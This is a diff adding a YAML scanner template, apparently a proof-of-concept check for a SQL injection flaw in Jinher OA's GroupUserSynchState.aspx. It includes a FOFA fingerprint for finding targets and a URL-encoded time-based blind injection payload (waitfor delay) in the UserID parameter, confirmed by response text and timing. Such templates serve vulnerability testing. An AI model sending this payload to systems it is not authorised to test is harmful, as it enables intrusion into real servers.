@@ -1,0 +1,30 @@
+id: poc-yaml-jinher-groupusersynchstate-aspx-sqli
+info:
+  name: 金和OA GroupUserSynchState.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /c6/Jhsoft.Web.AddMenu/GroupUserSynchState.aspx/?UserID=%27%77%61%69%74%66%6f%72%20%64%65%6c%61%79%27%30%3a%30%3a{{.t1}}%27%2d%2d&op=view
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"用户公开范围查看") &&
+
+    contains(gbk_decode(body),"外部系统名称") &&
+
+    contains(gbk_decode(body),"成功标识") &&
+
+    contains(body,"JHSoft") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
